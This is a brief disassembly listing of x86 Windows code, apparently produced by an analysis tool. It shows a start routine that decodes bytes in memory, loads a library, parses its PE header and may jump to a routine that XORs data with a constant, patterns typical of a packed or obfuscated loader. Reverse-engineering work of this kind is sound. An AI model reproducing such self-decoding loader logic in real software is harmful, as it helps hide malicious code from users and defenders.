0x004d009c:	movl	%edi, %edi	; from: 0x004d0622(MAY)
0x004d009e:	pushl	%ebp
0x004d009f:	movl	%esp, %ebp
0x004d00a1:	subl	$0x40, %esp
0x004d00a4:	movl	$0x4d31d0, %edx
0x004d00a9:	xorl	$0xffffddf9, -20(%edx)

start:
0x004d05e4:	pushl	$0x0
0x004d05e6:	call	lstrlen@kernel32.dll	; targets: 0xff0001b0(MAY)
0x004d05ec:	call	HeapCreate@kernel32.dll	; targets: 0xff000270(MAY)
0x004d05f2:	subl	$0xc, %esp
0x004d05f5:	call	HeapCreate@kernel32.dll	; targets: 0xff000270(MAY)
0x004d05fb:	subl	$0xc, %esp
0x004d05fe:	xorl	%eax, %eax
0x004d0600:	leal	0x4d3100(,%eax,2), %eax
0x004d0607:	leal	0xa(%eax), %ecx
0x004d060a:	subb	$0x50, (%ecx)
0x004d060d:	pushl	%eax
0x004d060e:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000250(MAY)
0x004d0614:	movl	0x3c(%eax), %ecx
0x004d0617:	addl	$0x29, %ecx
0x004d061a:	movl	(%eax,%ecx), %eax
0x004d061d:	movb	$0xffffff80, %cl
0x004d061f:	cmpb	%cl, %al
0x004d0621:	pusha	
0x004d0622:	ja	0x004d009c	; targets: 0x004d0628(MAY), 0x004d009c(MAY)
0x004d0628:	popa		; from: 0x004d0622(MAY)
0x004d0629:	ret	; targets: unresolved
